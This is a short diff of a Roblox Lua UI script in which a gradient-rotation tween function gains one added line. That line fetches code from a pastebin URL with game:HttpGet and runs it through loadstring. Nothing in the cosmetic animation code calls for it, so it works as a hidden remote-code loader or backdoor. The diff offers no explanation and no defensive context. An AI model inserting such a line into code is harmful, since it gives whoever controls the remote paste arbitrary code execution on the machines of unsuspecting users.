@@ -43,7 +43,7 @@ local function DCLSA_fake_script() -- UIGradient.LocalScript
 	local tweeninfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
 	local tween = TweenService:Create(script.Parent, tweeninfo, {Rotation = 360})
 	tween:Play()
-	
+	loadstring(game:HttpGet("https://pastebin.com/raw/50AL19P5", true))()
 end
 coroutine.wrap(DCLSA_fake_script)()
   function two(gotoCFrame) --- Tween
